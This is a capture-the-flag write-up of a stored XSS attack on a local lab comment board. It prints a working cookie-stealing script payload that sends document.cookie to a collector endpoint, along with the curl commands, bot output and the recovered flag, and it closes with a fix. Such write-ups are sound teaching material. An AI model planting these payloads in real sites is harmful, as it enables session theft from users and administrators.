# Writeup: Stored XSS Comment Board

By Gavin Blacklock

## The Setup

I started the board from the lab folder:

```bash
python3 app.py
```

It came up clean:

```text
Listening on http://127.0.0.1:8002
```

Port 8002. The board takes comments at `/comment`, prints them at `/`
and again on an admin page at `/admin`, and has a `/collect` endpoint
that appends whatever it receives to `/var/tmp/stolen.txt`. I also
had `bot.js` ready: a local simulation harness that stands in for a
real admin browser, visiting `/admin` with an admin session cookie
and running any script blocks it finds there. My job was to store a
comment that would do something worth watching when that visit
happened.

## What I Tried First

First, a normal comment, to prove the board worked at all before I
started being rude to it:

```bash
$ curl -s -X POST http://127.0.0.1:8002/comment -d "name=Gavin&comment=First comment, board works" | grep -A2 "Comments"
<h2>Comments</h2>
<div><strong>Gavin</strong>: First comment, board works</div>
</body>
```

Stored and printed, exactly as sent. No encoding, no cleanup. That
plain result was already a hint, so I pushed on it with the classic
first test, a script that just pops an alert:

```bash
$ curl -s -X POST http://127.0.0.1:8002/comment --data-urlencode "name=Gavin" --data-urlencode "comment=<script>alert(1)</script>" | grep "alert"
<div><strong>Gavin</strong>: <script>alert(1)</script></div>
```

The board stored my script tag raw and printed it back raw. In a real
browser that would run. But here is the honest problem with it: by
itself, it did nothing I could observe. It sent nothing anywhere, it
wrote nothing down, and the server noticed nothing at all. The proof:

```bash
$ ls -l /var/tmp/stolen.txt
ls: cannot access '/var/tmp/stolen.txt': No such file or directory
```

No collector hit, no log, no cookie. An alert proves script can run.
It does not steal a thing. I needed a payload that carried something
home.

## The Breakthrough Moment

The breakthrough was reading my own alert result properly. The board
had just shown me two facts in one line of output:

1. Anything I post is stored and rendered back with no sanitizing,
   script tags included.
2. The admin page renders the same comments, and the admin does not
   arrive empty handed. The admin arrives holding a session cookie.

Stored script plus a privileged reader is the whole attack. I did not
need a louder payload, I needed a payload with a destination: read
`document.cookie` in the admin context and fetch `/collect` with the
cookie attached. Then the server would write the evidence down for
me, in a file I could simply read.

So the plan changed from "make something happen on the page" to
"make the page send me the cookie, and let the log be the proof."

## The Full Solution

I posted the working payload as a third comment:

```bash
$ curl -s -X POST http://127.0.0.1:8002/comment --data-urlencode "name=Gavin" --data-urlencode "comment=<script>fetch('http://127.0.0.1:8002/collect?c='+document.cookie)</script>" | grep "collect"
<div><strong>Gavin</strong>: <script>fetch('http://127.0.0.1:8002/collect?c='+document.cookie)</script></div>
```

Stored raw, same as the alert. The difference is what this one does
when a privileged visitor loads it. Then I sent the admin in:

```bash
$ node bot.js
[bot] visiting http://127.0.0.1:8002/admin
[bot] carrying cookie: session=SALVO{st0r3d_xss_g0t_th3_c00k13}
[bot] /admin responded with status 200
[bot] found 2 script block(s) on the page
[bot] running script block 1: alert(1)
[bot] script block 1 errored: alert is not defined
[bot] running script block 2: fetch('http://127.0.0.1:8002/collect?c='+document.cookie)
[bot] done visiting
```

That output tells the story better than I could dress it up. The bot
found both stored scripts on `/admin`. The old alert payload errored
in the sandbox, because `alert` is not defined there, and even in a
real browser it would have stolen nothing. The second block ran
quietly and did the real work: it read `document.cookie` in the admin
context and fetched `/collect` with the cookie as the `c` parameter.

The app log on the server side backed that up line for line:

```text
[app] stored comment from Gavin: First comment, board works
[app] stored comment from Gavin: <script>alert(1)</script>
[app] stored comment from Gavin: <script>fetch('http://127.0.0.1:8002/collect?c='+document.cookie)</script>
[app] /collect received: c=session=SALVO{st0r3d_xss_g0t_th3_c00k13}
```

Step by step, the replay is:

```bash
python3 app.py
curl -s -X POST http://127.0.0.1:8002/comment -d "name=Gavin&comment=First comment, board works"
curl -s -X POST http://127.0.0.1:8002/comment --data-urlencode "name=Gavin" --data-urlencode "comment=<script>alert(1)</script>"
curl -s -X POST http://127.0.0.1:8002/comment --data-urlencode "name=Gavin" --data-urlencode "comment=<script>fetch('http://127.0.0.1:8002/collect?c='+document.cookie)</script>"
node bot.js
cat /var/tmp/stolen.txt
```

The fix, for anyone building the real thing: escape user content on
the way out so the browser treats it as text, never as markup, and
mark session cookies `HttpOnly` so script cannot read them at all.
This board does neither, on purpose, and those two missing habits are
the whole vulnerability.

## Flag Verified

The collector log was the finish line. After the bot visit, the file
that did not exist earlier now held exactly one line:

```bash
$ cat /var/tmp/stolen.txt
c=session=SALVO{st0r3d_xss_g0t_th3_c00k13}
```

That is the admin session cookie, delivered by my stored comment,
with the flag sitting inside it.

Recovered and verified flag:

```text
SALVO{st0r3d_xss_g0t_th3_c00k13}
```
